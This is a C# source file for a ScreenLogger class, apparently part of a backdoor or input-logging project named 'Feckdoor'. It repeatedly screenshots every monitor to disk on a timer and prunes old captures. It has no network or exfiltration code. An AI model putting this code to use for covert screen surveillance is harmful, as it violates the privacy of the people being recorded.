using System.Diagnostics;
using System.Text;
using System.Linq;

namespace Feckdoor.InputLog
{
	public class ScreenLogger : IDisposable
	{
		protected readonly CancellationTokenSource cancel;

		private readonly ImageFormat imageFormat = null!;
		private bool disposed;

		public ScreenLogger()
		{
			cancel = new CancellationTokenSource();

			string imageFormatString = Config.TheConfig.ScreenCapture.ImageFormat;
			var imageFormatField = typeof(ImageFormat).GetProperty(imageFormatString);
			if (imageFormatField == null)
			{
				Log.Error("Unsupported image format: {fmt}.", imageFormatString);
				return;
			}
			imageFormat = (ImageFormat)imageFormatField.GetValue(null)!;

			Task.Run(async () => await ScreenCapturerProc(cancel.Token));
		}

		private async Task ScreenCapturerProc(CancellationToken ct)
		{
			while (!ct.IsCancellationRequested)
			{
				int cnt = Screen.AllScreens.Length;

				try
				{
					var dirName = Path.GetDirectoryName(Config.TheConfig.ScreenCapture.FileNameFormat);
					if (dirName == null)
					{
						Log.Warning("Directory unavailable for screen capture. Disabling screen capture.");
						return;
					}

					var enumeration = Directory.GetFiles(Path.GetFullPath(dirName), "*" + Path.GetExtension(Config.TheConfig.ScreenCapture.FileNameFormat));
					int deleted = enumeration.Length - Config.TheConfig.ScreenCapture.RetainedCaptureCount;
					if (deleted > 0)
					{
						var enumerationSorted = enumeration.OrderBy(file => new FileInfo(file).LastWriteTime).ToList();
						for (int i = 0; i < deleted; i++)
						{
							string file = enumerationSorted[i];
							try
							{
								File.Delete(file);
								Log.Debug("Deleted old screen capture file {file}.", file);
							}
							catch (IOException e)
							{
								// Should handle IOException
								Log.Warning(e, "IOException during deleting old screen capture file {file}.", file);
							}
						}
					}
				}
				catch (Exception e)
				{
					Log.Warning(e, "Exception during deleting old capture files.");
				}

				for (int i = 0; i < cnt; i++)
				{
					try
					{
						Rectangle bounds = Screen.AllScreens[i].Bounds;
						using var bmp = new Bitmap(bounds.Width, bounds.Height);
						using (var gr = Graphics.FromImage(bmp))
							gr.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
						string fileName = string.Format(Config.TheConfig.ScreenCapture.FileNameFormat, DateTime.Now, i);
						bmp.Save(fileName, imageFormat);
						Log.Debug("Captured screen number {n} to file {file}.", i, fileName);
					}
					catch (Exception e)
					{
						Log.Error(e, "Exception during capturing screen {n}.", i);
					}
				}

				await Task.Delay(Config.TheConfig.ScreenCapture.CapturePeriod, ct);
			}
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposed)
			{
				cancel.Cancel();
				disposed = true;
			}
		}

		public void Dispose()
		{
			Dispose(disposing: true);
			GC.SuppressFinalize(this);
		}
	}
}
